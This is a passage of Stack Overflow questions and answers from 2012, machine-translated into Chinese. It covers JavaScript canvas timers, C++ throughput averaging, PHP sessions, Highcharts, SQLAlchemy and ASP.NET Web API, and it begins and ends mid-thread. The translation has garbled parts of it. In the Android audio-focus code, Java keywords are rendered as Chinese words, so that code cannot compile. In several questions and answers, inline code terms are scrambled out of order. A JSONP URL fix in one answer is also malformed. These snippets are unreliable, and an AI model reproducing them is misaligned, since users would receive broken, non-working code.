​&lt;canvas id="myCanvas"></canvas>​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

您可以简单地在画布的事件上设置超时`mousedown`，然后在事件上清除它`mouseup`。

这是一个[演示](http://jsfiddle.net/f23ZW/)

```
​var canvas = document.getElementById('myCanvas');
var timer = null;

​canvas.onmousedown = function(){
  timer = setTimeout( doStuff, 2000 );
};

canvas.onmouseup = function(){
  clearTimeout( timer );
};

function doStuff() {
  alert('hello, you just pressed the mousebutton for two seconds.')
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T07:35:00.487

您可以使用[Hammer.js](http://eightmedia.github.com/hammer.js/)并收听“保持”事件。

# c# - c#中IPad和IIS之间的TCP/IP连接

> ID：11735250
> 
> 赞同：2
> 
> 时间：2012-07-31T07:31:17.737
> 
> 标签：c#, iis-7, tcpclient

我想在我的 IIS 和 Ipad 或 Android 设备之间实现 TCP/IP 连接。为此，我在 IIS 中打开一个端口，该端口始终接受来自设备的连接。如果客户端和服务器之间建立了连接，则服务器将保持连接并稍后响应设备请求。因为我的要求是当我在服务器上有更新时我想提醒设备。或者是否有任何替代方法可用于识别设备。如果可以，请你帮助我。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:35:37.483

看看[SignalR](https://github.com/SignalR/SignalR/)。它就是为这种情况而设计的。

# c++ - 吞吐量网络估计

> ID：11735258
> 
> 赞同：1
> 
> 时间：2012-07-31T07:31:36.013
> 
> 标签：c++, algorithm, networking, network-programming

我如何估计瞬时吞吐量？例如，以类似于下载文件时浏览器所做的方式。这不仅仅是平均吞吐量，而是瞬时估计，可能带有“移动平均线”。我正在寻找算法，但您可以在 c++ 中指定它。理想情况下，它不会涉及线程（即，持续刷新，比如说每秒），而是仅在询问值时才进行评估。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:44:31.457

您可以使用指数移动平均线，如此[处](https://stackoverflow.com/a/10990656/315052)所述，但我将重复该公式：

```
accumulator = (alpha * new_value) + (1.0 - alpha) * accumulator 
```

为了实现估计，假设您打算每秒查询一次计算，但您想要最后一分钟的平均值。然后，这是获得该估计的一种方法：

```
struct AvgBps {
    double rate_;            // The average rate
    double last_;            // Accumulates bytes added until average is computed
    time_t prev_;            // Time of previous update
    AvgBps () : rate_(0), last_(0), prev_(time(0)) {}
    void add (unsigned bytes) {
        time_t now = time(0);
        if (now - prev_ < 60) {       // The update is within the last minute
            last_ += bytes;           // Accumulate bytes into last
            if (now > prev_) {        // More than a second elapsed from previous
                // exponential moving average
                // the more time that has elapsed between updates, the more
                // weight is assigned for the accumulated bytes
                double alpha = (now - prev_)/60.0;
                rate_ = (1 -alpha) * last_ + alpha * rate_;
                last_ = 0;            // Reset last_ (it has been averaged in)
                prev_ = now;          // Update prev_ to current time
            }
        } else {                      // The update is longer than a minute ago
            rate_ = bytes;            // Current update is average rate
            last_ = 0;                // Reset last_
            prev_ = now;              // Update prev_
        }
    }
    double rate () {
        add(0);                       // Compute rate by doing an update of 0 bytes
        return rate_;                 // Return computed rate
    }
}; 
```

您实际上应该使用单调时钟而不是`time`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T16:48:23.613

你可能想要一个平均棚车。

只需保留最后 n 个值，然后对它们进行平均。对于每个后续块，减去最旧的并添加最新的。请注意，对于浮点值，您可能会遇到一些聚合错误，在这种情况下，您可能需要从头开始重新计算每个 m 值的总数。当然，对于整数值，您不需要这样的东西。

# php - session_save_path 设置失败

> ID：11735261
> 
> 赞同：0
> 
> 时间：2012-07-31T07:31:45.017
> 
> 标签：php, apache, session, configuration

我无法从 php 脚本中设置我的自定义 php 会话保存路径。

```
ini_set('session.save_path', "/var/www/domain.com/sessions");
echo ini_get('session.save_path')."<br />";

session_save_path("/var/www/domain.com/sessions");
echo session_save_path()."<br />"; 
```

上面的代码打印

```
/var/www/domain.com/tmp

/var/www/domain.com/tmp 
```

这意味着默认设置仍然存在。

我非常受限于任何解决方法：1）无法访问 php.ini 2）htaccess 导致错误 500 - php_value 指令被禁用

所以我真的需要从 php 脚本内部覆盖会话存储。

任何想法如何解决这个问题？

（目录 /var/www/domain.com/sessions 存在于 owner/group = root/root 下，为其他人正确设置了写权限。与默认 tmp 目录完全相同。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T06:28:00.870

Apache 目前将 PHP 作为 PHP_MOD 运行。

AFAIK 在 PHP 采用 CGI 或 FASTCGI 之前没有解决方案。

# javascript - WebView loadURL("javascript:XYZ") 在我的 webview 中执行了几次

> ID：11735268
> 
> 赞同：0
> 
> 时间：2012-07-31T07:32:09.767
> 
> 标签：javascript, android, android-webview

我有一个 webview 显示一条消息以确认用户交互。该消息应该在该页面上其他位置的任何用户交互后淡出。为此，我检测到任何 onTouchEvent 并返回对网页的调用以触发消息淡出。

这第一次效果很好，但如果我第二次这样做（网页没有重新加载，但通过将不透明度设置回 1 并显示为“阻止”，通过 javascript 再次显示消息）消息再次出现但随后淡出立即没有任何用户交互。从日志语句中我可以看到 onTouchEvent 没有被触发并且我没有注入 javascript。

我怀疑 loadURL 在网页中创建了一些弹性调用，这些调用会一直存在并以某种方式再次激活。有什么办法可以清除它并只看到它执行一次？

我像这样在我的 WebView 中捕获 onTouchEvent：

```
 final class MyWebView extends WebView {
    ...
    @Override
    public boolean onTouchEvent(MotionEvent event) {
        Log.v(TAG,"onTouchEvent");
        if (mUndoActive && (event.getAction() == MotionEvent.ACTION_DOWN)) {
            mUndoActive = false;
            mLastAction = LAST_ACTION_NONE;
            Log.v(TAG,"send hide message");
            handler.sendEmptyMessageDelayed(CLICK_ON_WEBVIEW, 300);
        }
        return super.onTouchEvent(event);
    }
} 
```

在父活动中，我覆盖了 handleMessage 并将 javascript 注入到我的 webview 以触发淡出消息元素的 javascript，如下所示：

```
 @Override
    public boolean handleMessage(Message msg) {
      Log.v(TAG,"handleMessage triggered");
      if (msg.what == CLICK_ON_WEBVIEW){
        Log.v(TAG,"handle message registerd click from stack view web page");
        webview.loadUrl("javascript:hideMessage()");
        return true;
      }
      return false;
    } 
```

和 webview 中的 javascript 是：

```
function hideMessage() {
  var message = document.getElementById("message");
  if (message != null) {
    if (!message.style.opacity) {
     message.style.opacity = 1;
    } 
    var fader = setInterval(function(){
      message.style.opacity -= .02;
      if (message.style.opacity <= 0) {
        clearInterval(fader);
        message.style.display = "none";
      }
    }, 25);
   }
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:44:05.597

我自己找到了一个解决方案：在 2 个间隔调用之前使用窗口，即。window.clearInterval(fader) 确实解决了这个问题。我不太明白为什么，但看起来间隔计时器确实一直在运行并且没有正确关闭。

# javascript - 用于 Qualtrics 的 Javascript

> ID：11735272
> 
> 赞同：-2
> 
> 时间：2012-07-31T07:32:12.450
> 
> 标签：javascript, qualtrics

我需要一点 Javascript 的帮助。我想在 Qualtrics 上显示两张图像，但延迟 5 秒后。

为了更清楚，Image2 应该在 Image1 显示 5 秒后显示。

```
Qualtrics.SurveyEngine.addOnload(function()    
{    
    /*Place Your Javascript Below This Line*/    
});​ 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T20:32:02.333

这是对 Qualtrics 网站上计时器的修改：

[http://www.qualtrics.com/university/researchsuite/coders-corner/html-and-css#displaytimer](http://www.qualtrics.com/university/researchsuite/coders-corner/html-and-css#displaytimer)

几点注意事项：

1.  我不确定您是否想让第一个图像在第二个图像出现时消失，但这就是您将使用此 JavaScript 获得的行为。
2.  我离开倒计时只是为了说明时间和图像出现和消失之间的关系。
3.  以防万一它不完全清楚。我使用的图像代码必须替换为您从自己的 Qualtrics 图像库中获得的链接。因此 img src="https://yourorghere.qualtrics.com/CP..." 将被您在 Qualtrics 的组织网址所取代

这是CSS：

```
.pic2 {
 display: none;
}​ 
```

### **图 1：**

这是html：

```
Time: <span id="time1">30</span><br>
<img src="https://yourorghere.qualtrics.com/CP/Graphic.php?IM=IM_bCpAC12YW14vbtq" style="width: 133px; height: 115px;" class='pic1' /> 
```

添加此 javascript 替换默认的 Qualtrics JavaScript：

```
started = false;
function countDown1() {
  if (!started)
    started = true;
  else {
    var value1 = parseInt($('time1').innerHTML);
    $('time1').innerHTML = value1 - 1;

    if (value1 == 26) {
      var styling1 = document.getElementsByClassName('pic1')[0];
      styling1.style.display = "none";
    }
  }
  setTimeout(countDown1, 1000);
}
Event.observe(window, 'load', countDown1);​ 
```

### **图 2：**

这是html：

```
Time: <span id="time2">30</span><br>
<img src="https://yourorghere.qualtrics.com/CP/Graphic.php?IM=IM_4Vjre9FrrbA828s" style="width: 117px; height: 107px;" class='pic2' /> 
```

替换默认 Qualtrics JavaScript 的 JavaScript：

```
started = false;
function countDown2() {
    if (!started)
        started = true;
    else {
        var value2 = parseInt($('time2').innerHTML);
        $('time2').innerHTML = value2 - 1;

        if (value2 == 25) {
            var styling2 = document.getElementsByClassName('pic2')[0];
            styling2.style.display = "block";

        }
    }
    setTimeout(countDown2, 1000);
}
Event.observe(window, 'load', countDown2); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-31T15:30:49.653

您实际上不需要 Javascript 来执行此操作。在 Qualtrics 中，您可以添加“计时”问题以在 5 秒后自动推进参与者。就是这样：

1.  插入要显示的第一张图片
2.  添加计时问题（将右侧的自动前进选项设置为“5”，持续 5 秒）
3.  在计时问题后插入分页符
4.  在分页符之后插入要显示的第二张图像

那应该这样做。如果您还有任何问题，请通过 support@qualtrics.com 联系我们

感谢您使用 Qualtrics。在 Facebook 和 Twitter @qualtrics 上分享爱

-Qualtrics团队

# c++ - 有人可以解释他们的意思是 list.pushback 文档（不会使迭代器无效）

> ID：11735278
> 
> 赞同：1
> 
> 时间：2012-07-31T07:32:22.990
> 
> 标签：c++, std

在 list.pushback 文档中说

> 由于 %list 的性质，此操作可以在恒定时间内完成，并且不会使迭代器和引用无效。

add 如何不能改变迭代器？他们所说的不使引用无效是什么意思？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:35:45.843

这意味着在调用之前获得的所有迭代器和引用`push_back`仍然可以在以下情况下使用：

```
std::list<int> numbers { 2, 3, 5, 7};
auto it = numbers.begin();
int& r  = numbers.front();
numbers.push_back(11);
std::cout << *it << '\n';   // guaranteed to print 2
std::cout <<   r << '\n';   // guaranteed to print 2 
```

其他数据结构不一定提供这样的保证。如果使用向量而不是列表，则每次调用`push_back`都可能使调用之前获得的所有迭代器和引用无效，因为容量可能会耗尽，在这种情况下，必须将数据移动到更大的数组中。使用无效的迭代器或引用会导致未定义的行为（阅读：任何事情都可能发生）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:37:06.857

作为一个例子与行为进行比较`std::vector`。如果你这样做：

```
std::vector<int> foo(1);
std::vector<int>::iterator it = foo.begin();

foo.push_back(2);

*it = 0; 
```

这是非法的 - 调用行为`push_back`可能导致向量增长。这种增长会导致分配新内存并将内容移入其中，然后再释放较旧的较小内存。

`std::list`不适用。它是一个链表，因此当您添加新元素时，列表中的其他元素不会更改。增长纯粹是本地的事情。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:35:56.400

将元素附加到`list`不会更改其他元素，因此对这些元素的迭代器和引用仍然有效

# php - 在 codeigniter 中为常量使用配置文件

> ID：11735280
> 
> 赞同：0
> 
> 时间：2012-07-31T07:32:29.603
> 
> 标签：php, codeigniter, constants

我正在使用 cibonfire，我必须在我的程序中使用一些可以稍后更改的常量。所以我正在做的是我在里面编写我的配置文件`application/config/roles.php` 并在我的模块中使用该配置文件来获取该常量，但我没有得到所需的结果。

**解决了...**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:42:18.617

解决了 ：）

在我看来页面，我这样做了

`<?php $role_name = $this->config->item('roles.permission','roles'); ?>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:38:31.920

首先，这些不是常量，如果它们是您以后无法更改它们，因此命名为常量！

除此之外..我相信您没有加载配置文件..尝试将其添加到您的控制器文件中

```
$this->config->load('roles'); 
```

# kendo-ui - 自定义验证或自定义规则来检查 kendo UI 网格的唯一用户名

> ID：11735282
> 
> 赞同：1
> 
> 时间：2012-07-31T07:32:39.930
> 
> 标签：kendo-ui

我正在使用带有 webAPI 的 MVC 架构。我使用了带有弹出编辑功能的剑道网格，当我单击“添加新记录”链接时，会出现一个包含各个字段的弹出窗口。我想验证我的用户名字段。用户名验证是检查输入的用户名是否唯一。如果用户名不是唯一的，那么它应该提出一个验证，说明“用户名不是唯一的”。为此，我想为 kendo 网格编写一个自定义验证，它将调用服务器端函数，如果用户名对我的客户端函数不是唯一的，则返回值为 true 并引发验证消息。有没有一种方法可以通过编写自定义验证或自定义规则来验证我的剑道网格。

请帮我解决这个问题。

问候， 卡提克

# jquery - 获取 Foursquare 场地 API

> ID：11735283
> 
> 赞同：0
> 
> 时间：2012-07-31T07:32:43.520
> 
> 标签：jquery, json, api, foursquare

我几乎没有尝试制作应用程序，但我需要从foursquare获取场地，我目前正在使用此代码，但奇怪的是我什么也没得到。

```
<script>
var latLong = '17.548065, -99.500868';
var url = 'https://api.foursquare.com/v2/venues/explore?ll=40.7,-74&radius=500&client_id=XXXX&client_secret=XXXX&v=20120731';
$.getJSON(url, function(json) {
console.log(json);
$("#results").html(json.response.groups.venue.name);
 });
</script> 
```

另外，如果您能帮助我使用 Google Places API 做同样的事情，我将非常感激。

[https://developers.google.com/maps/documentation/places/?hl=es](https://developers.google.com/maps/documentation/places/?hl=es)

此致！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:37:14.653

你需要`JSONP`改用。

尝试附加`?callback=?`到`url`.

```
var url = 'https://api.foursquare.com/v2/venues/explore?ll=40.7,-74&radius=500&client_id=XXXX&client_secret=XXXX&v=20120731?callback=?'; 
```

# java - JPA 桌面应用程序和远程 MySQL - 操作方法

> ID：11735289
> 
> 赞同：0
> 
> 时间：2012-07-31T07:32:56.217
> 
> 标签：java, mysql, jpa

我有一个摆动桌面应用程序，JPA 和 MySQL 在同一台机器上。现在我想把这个相同的应用程序带到一个网络环境中，而 MySQL 在另一台机器上。

我的选项在哪里使用我的主机的 ip 地址或机器名称`persistence.xml`。但是根据您的经验，我可以使用的最好的方法是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:38:33.657

主机名更好，因为它们更人性化且不易更改。

IP是机器的更底层的ID。

问候菲利普

# regex - 正则表达式：如何删除相同字符串的重复？

> ID：11735292
> 
> 赞同：1
> 
> 时间：2012-07-31T07:33:21.787
> 
> 标签：regex, python-2.7

我正在尝试从日期中找到年份。日期格式为

```
"Nov.-Dec. 2010"
"Aug. 30 2011-Sept. 3 2011"
"21-21 Oct. 1997" 
```

```
my regular expression is
q = re.compile("\d\d\d\d")
a = q.findall(date) 
```

所以很明显在列表中它有两个项目，如`"Aug. 30 2011-Sept. 3 2011"`

```
["2011","2011"] 
```

我不想重复，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:52:34.930

您可以在正则表达式中使用反向引用（请参阅[此处](http://docs.python.org/library/re.html#regular-expression-syntax)的语法）：

```
(\d{4}).*\1 
```

或者您可以使用当前的正则表达式并将此逻辑放入 python 代码中：

```
if a[0] == a[1]:
    ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:57:42.003

使用以下功能：

```
def getUnique(date): 
  q = re.compile("\d\d\d\d") 
  output = [] 
  for x in q.findall(date): 
     if x not in output: 
         output.append(x) 
  return output 
```

虽然它是 O(n^2)，但对于输入列表的每个元素重复使用 not in

请参阅[如何从 Python 列表中删除重复项并保持顺序？](https://stackoverflow.com/questions/479897/how-do-you-remove-duplicates-from-a-list-in-python)

# java - 警报窗口中的消息显示

> ID：11735299
> 
> 赞同：0
> 
> 时间：2012-07-31T07:33:46.670
> 
> 标签：java, struts

我正在研究 Struts 模型，我只是想知道如何通过警报窗口显示结果消息。

此代码返回的结果消息：

```
<html:messages id="msg" header="message.header" footer="message.footer">
    <li><b><bean:write name="msg" /></b></li>
</html:messages> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T20:44:36.713

试试这个解决方法。可以用表达式语言替换“bean:write”标签。

```
<script>var txt = '';</script>

<html:messages id="msg">
    <script>txt += '${msg}\n';</script>
</html:messages>

<script>alert(txt);</script> 
```

# android - 在 android 中启动新应用时，正在运行的应用暂停

> ID：11735303
> 
> 赞同：0
> 
> 时间：2012-07-31T07:33:59.893
> 
> 标签：android

我开发了一个录音机，它在前台和后台都能完美运行。但是当我在后台运行录音机并启动另一个使用声音的应用程序时出现问题（如录像机、音乐播放器、视频播放器等）所以应用程序会崩溃。所以我想在录音机中添加一个功能，当使用麦克风或扬声器的其他应用程序（如录像机、音乐播放器、视频播放器等）在前台运行时，录音机会自动进入暂停状态。提前致谢.

如果您仍然不明白我的问题，请使用您的手机并播放音乐播放器，而不是回家。所以音乐播放器正在运行。然后打开另一个没有使用麦克风和扬声器的应用程序，所以音乐播放器仍在运行，但是当你打开另一个使用麦克风和扬声器的应用程序（如录像机、音乐播放器、视频播放器等）时音乐播放器将暂停。我想要这种类型的功能。提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T06:12:59.857

最后大量搜索和谷歌搜索我得到了这个问题的答案。我正在使用 audiofocuschangelistener。代码在那里

```
AudioManager.OnAudioFocusChangeListener audioFocusChangeListener = new AudioManager.OnAudioFocusChangeListener() {

        公共无效 onAudioFocusChange(int focusChange) {
            开关（焦点改变）
            {
            案例 AudioManager.AUDIOFOCUS_GAIN：
            案例 AudioManager.AUDIOFOCUS_GAIN_TRANSIENT：
            案例 AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK：
                  //恢复你的活动
                   休息;
            案例 AudioManager.AUDIOFOCUS_LOSS：
            案例 AudioManager.AUDIOFOCUS_LOSS_TRANSIENT：
            案例 AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK：
                   ///暂停你的活动
                   休息;
            }

        }
    };      

```

并在 onCreate() 中执行此操作

```
AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
int 结果 = audioManager.requestAudioFocus(audioFocusChangeListener, AudioManager.STREAM_MUSIC,AudioManager.AUDIOFOCUS_GAIN_TRANSIENT);
                如果（结果 == AudioManager.AUDIOFOCUS_REQUEST_GRANTED）{
                    //开始你的活动
                }

```

有关更多信息，您可以点击以下链接

[http://developer.android.com/training/managing-audio/audio-focus.html](http://developer.android.com/training/managing-audio/audio-focus.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:41:15.153

据我从你的问题中了解到，当它不是前台应用程序时，你需要你的应用程序停止它正在做的任何事情（可能是录音？）。

您需要在主要活动中覆盖[onPause](http://developer.android.com/reference/android/app/Activity.html#onPause%28%29)方法，以便当您的活动进入后台（新活动出现）时，您可以停止记录器。

此外，当用户再次开始与您的应用程序交互时，您可以通过覆盖[onResume](http://developer.android.com/reference/android/app/Activity.html#onResume%28%29)方法来恢复您的活动任务。

# android - 任何机构都可以访问存储在 android 应用程序数据文件夹中的数据库文件吗？

> ID：11735304
> 
> 赞同：0
> 
> 时间：2012-07-31T07:34:02.270
> 
> 标签：android

我正在使用 SQLite 数据库在我的应用程序中存储数据。我创建的用于我的应用程序的数据库可以被其他人或任何外部应用程序访问吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:38:29.220

不会。数据库文件存储在 /data/data/yourpackage.yourapp/database 中。在非 root 手机上，您甚至没有文件系统访问权限。出于非常好的安全原因，其他应用程序也无法访问此文件。

如果您想与其他应用程序共享数据或想使用来自其他应用程序的数据，请检查

[http://developer.android.com/guide/topics/providers/content-providers.html](http://developer.android.com/guide/topics/providers/content-providers.html)

# struts2 - 在struts.xml 中重用redirect-action？

> ID：11735305
> 
> 赞同：0
> 
> 时间：2012-07-31T07:34:06.840
> 
> 标签：struts2

我有多个操作完成后重定向回一般页面（showStuff）。我正在寻找一种不为每个重定向操作重复参数列表的方法。

我所拥有的是：

```
<action name="doThis" class="com.domain.package.MyAction" method="doThis">
    <result type="redirectAction">
        <param name="actionName">showStuff</param>
        <param name="parse">true</param>
        <param name="selectedYear">${selectedYear}</param>
        <param name="selectedMonth">${selectedMonth}</param>
        <param name="selectedDay">${selectedDay}</param>
    </result>
</action>
<action name="doThat" class="com.domain.package.MyAction" method="doThat">
    <result type="redirectAction">
        <param name="actionName">showStuff</param>
        <param name="parse">true</param>
        <param name="selectedYear">${selectedYear}</param>
        <param name="selectedMonth">${selectedMonth}</param>
        <param name="selectedDay">${selectedDay}</param>
    </result>
</action> 
```

我想将参数列表保留在 showStuff 操作定义中，然后使用如下：

```
<action name="doThis" class="com.domain.package.MyAction" method="doThis">
    <result type="redirectAction">
        <param name="actionName">showStuff</param>
    </result>
</action>
<action name="doThat" class="com.domain.package.MyAction" method="doThat">
    <result type="redirectAction">
        <param name="actionName">showStuff</param>
    </result>
</action> 
```

可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T14:22:37.530

有几个选项。

老实说，我会跳过大部分解决方法，并将它们放入会话中。

一旦他们进入会话，创建一个拦截器和接口（`Dateable`或其他东西）。在拦截器中检查会话中的变量（见下文），如果动作是 a `Dateable`，将它们设置在动作上，就完成了。

另一种选择是将这些变量封装为日期，并使用内置转换器或使用您自己的转换器。那么你只需要一个参数。此选项也适用于拦截器的想法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T11:59:36.727

事实证明，这是很有可能的。这就是你的做法：

添加全局结果：

```
<global-results>
    <result name="show-stats" type="redirectAction">    
        <param name="actionName">showStats</param>
        <param name="parse">true</param>
        <param name="selectedYear">${selectedYear}</param>
        <param name="selectedMonth">${selectedMonth}</param>
        <param name="selectedDay">${selectedDay}</param>
  </result> 
```

然后对于动作：

```
<action name="doThis" class="com.domain.package.MyAction" method="doThis"/>
<action name="doThat" class="com.domain.package.MyAction" method="doThat"/> 
```

最后在java代码中，只需：

```
return "show-stats"; 
```

你完成了。

作为旁注，为什么我必须花这么多时间来坚持非常基本的 DRY 原则？不是所有这些框架都应该..你知道..简化东西吗？就是想...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-04T16:04:28.220

我面临着同样的问题，无休止的参数列表越来越长，在几个地方重复。我最终做的是我创建了一个外部文件并在 struts.xml 中将其声明为一个实体，然后包含它而不是重复所有参数

这在 doctype 标签中

```
<!ENTITY referenceName SYSTEM "fileName"> 
```

然后你像这样包含它

```
&referenceName; 
```

# javascript - HighCharts - 使饼图占 div 的 100%

> ID：11735306
> 
> 赞同：39
> 
> 时间：2012-07-31T07:34:09.250
> 
> 标签：javascript, highcharts

如何制作包含它的图表`pie`填充？的宽度为，高度为。`100%``div``div``198px``152px`

另外我想`linear-gradient`在每个馅饼片内产生效果，你能建议如何做到这一点吗？

![在此处输入图像描述](../Images/6298c8354dac2e429d2c4a70f5aa8cef.png)

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2012-07-31T12:06:14.227

您可以通过在饼图中设置`size`属性并从图表中`plotOptions`删除`margins`,来实现饼图的全高。`spacing``titles`

**代码**

```
 chart: {           
        margin: [0, 0, 0, 0],
        spacingTop: 0,
        spacingBottom: 0,
        spacingLeft: 0,
        spacingRight: 0
    },
    plotOptions: {
        pie: {
            size:'100%',
            dataLabels: {
                enabled: false
            }
        }
    } 
```

**示例** *（将小提琴更新为指向 2.2.4 版本）*

这是一个演示这一点的[示例。](http://jsfiddle.net/epoch/xeb3n/)

~~至于线性渐变，我不知道它们是否已经实现，但这里有一个显示径向渐变的[示例。](http://jsfiddle.net/highcharts/LCdVd/)~~

径向渐变现在也是 Highcharts 3.0 的一部分，这里是一个[例子](http://www.highcharts.com/demo/pie-gradient)

**更新**

~~看起来从 Highcharts 3.0 开始，由于绘图区域内的图表自动缩放，这不再可能，这是他们文档的摘录：~~

> size：饼图相对于绘图区域的直径。可以是百分比或像素值。像素值以整数形式给出。**默认行为（从 3.0 开始）是缩放到绘图区域并为绘图区域内的数据标签留出空间。**因此，当点更新和数据标签更多时，饼图的大小可能会有所不同。在这种情况下，最好设置一个固定值，例如“75%”。默认为 .

在我看来，这不应该是这种情况，因为`dataLabels`被禁用。应该可能被记录为[错误](http://github.com/highslide-software/highcharts.com/issues/3291)

**更新（2014 年 8 月）**

根据[Torstein 的](https://stackoverflow.com/users/1069158/torstein-h%C3%B8nsi)评论，这确实仍然是可能的。除了边距开始设置外，还[`slicedOffset`](http://api.highcharts.com/highcharts#plotOptions.pie.slicedOffset)需要设置为。`0`（[示例](http://jsfiddle.net/highcharts/xV8PM/2/)）

```
$(function () {
    $('#container').highcharts({
        title: null,
        chart: {
            type: 'pie',
            margin: 0
        },

        plotOptions: {
            pie: {
                slicedOffset: 0,
                size: '100%',
                dataLabels: {
                    enabled: false
                }
            }
        },

        series: [{
            data: [
                ['Firefox',   44.2],
                ['IE7',       26.6],
                ['IE6',       20],
                ['Chrome',    3.1],
                ['Other',    5.4]
            ]
        }]
    });
});
```

```
#container {
    outline: 1px solid red;
    padding: 0;
}
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script src="https://code.highcharts.com/highcharts.js"></script>
<div id="container" style="height: 400px; width: 500"></div>
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-31T11:59:38.317

我的解决方案；（对于图例位置边距顶部错误..）

```
chart: {
                    plotBackgroundColor: null,
                    plotBorderWidth: null,
                    plotShadow: false,
                    type: 'pie',
                    height:'100%' // added...
                },

plotOptions: {
        pie: {
            size:'100%',
             height: '100%',
            dataLabels: {
                enabled: false
            }
        }
    } 
```

# postgresql - 如何在 SQLAlchemy 中使用 UPDATE ... FROM？

> ID：11735308
> 
> 赞同：2
> 
> 时间：2012-07-31T07:34:20.100
> 
> 标签：postgresql, sqlalchemy

我想在 SQLAlchemy / Postgres 中写这样的语句：

```
UPDATE slots
  FROM (SELECT id FROM slots WHERE user IS NULL
    ORDER BY id LIMIT 1000) AS available
   SET user='joe'
 WHERE id = available.id
 RETURNING *; 
```

即，我想更新与指定条件匹配的有限数量的行。

PG

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-04T08:54:56.887

我能够这样做：

```
limited_slots = select([slots.c.id]).\
    where(slots.c.user==None).\
    order_by(slots.c.id).\
    limit(1000)
stmt = slots.update().returning(slots).\
    values(user='joe').\
    where(slots.c.id.in_(limited_slots)) 
```

我认为它不如原始 SQL 查询高效，但是如果数据库内存足够大以容纳所有相关段，它应该不会有太大区别。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-04T21:05:42.993

自从我使用 sqlalchemy 以来已经有一段时间了，所以将以下内容视为伪代码：

```
for i in session.query(Slots).filter(Slots.user == None):
    i.user = "Joe"
    session.add(i)

session.commit() 
```

我推荐[sqlalchemy ORM 教程](http://docs.sqlalchemy.org/en/rel_0_7/orm/tutorial.html)。

# visual-studio-2010 - Reporting Services - 一次编辑多个（类似）报告？

> ID：11735311
> 
> 赞同：1
> 
> 时间：2012-07-31T07:34:45.157
> 
> 标签：visual-studio-2010, service, reporting-services, reporting

我正在 Visual Studio 2010 中编辑 20 多个类似的“报告服务”-报告，一个常见的烦恼是每当我必须对报告进行轻微更改时（例如更改字体、添加参数或添加文本框） ，我必须经历所有这些才能做出改变。我知道有一种制作模板的方法，但我的问题是在创建多个模板后对其进行更改（据我所知，模板功能仅用于创建报告文档）。

非常感谢任何帮助，如果您需要更多信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:58:37.293

我不确定它是否有帮助，但您可以尝试使用[子报表](http://msdn.microsoft.com/en-us/library/dd239314.aspx)

# mysql - Mysql Join 具有不同的值

> ID：11735322
> 
> 赞同：3
> 
> 时间：2012-07-31T07:35:34.530
> 
> 标签：mysql

表名：x

id name id 是主键

```
1   xxxx
2   yyyy 
```

表名：y
sno 主键 id 外键类

```
1 1 first 
2 1  second 
```

输出

```
id 
xxxx first second 
```

我不想为每一行重复名称

```
SELECT x.name, y.class from x,y  WHERE x.id = y.id 
```

此查询输出为 xxxx first 和 xxxx second

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T07:38:32.263

然后添加`GROUP BY y.id`以避免重复。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:38:21.800

```
SELECT x.name, y.class 
FROM x
     LEFT JOIN (SELECT DISTINCT id, class FROM y) y 
        ON x.id = y.id; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:16:23.383

试试这个：

```
set @yclass:='';
select  a.name,max(class) as class
from
(select @xname:=name as name,@yclass:=concat(@yclass,' ',y.class)  as class
from x join y
on x.id=y.id)a 
```

# asp.net - ASP.Net Web API 中的 HandleUnauthorizedRequest

> ID：11735324
> 
> 赞同：3
> 
> 时间：2012-07-31T07:35:44.057
> 
> 标签：asp.net, authorization, asp.net-web-api, custom-error-pages

我正在开发一个 ASP.Net Web API 应用程序，并且我使用 AuthorizeAttribute 进行身份验证。当认证失败时，执行的代码就是这个。

```
protected override void HandleUnauthorizedRequest(HttpActionContext actionContext)
    {
        HttpContext.Current.Response.AddHeader("AuthenticationStatus", "NotAuthorized");
        actionContext.Response = actionContext.Request.CreateResponse(HttpStatusCode.Forbidden);
        return;
    } 
```

此代码导致从浏览器显示未经授权的请求页面，但我想要的是显示我设计的自定义页面。我怎么做？

* * *

## 回答 #1

> 赞同：6
> 
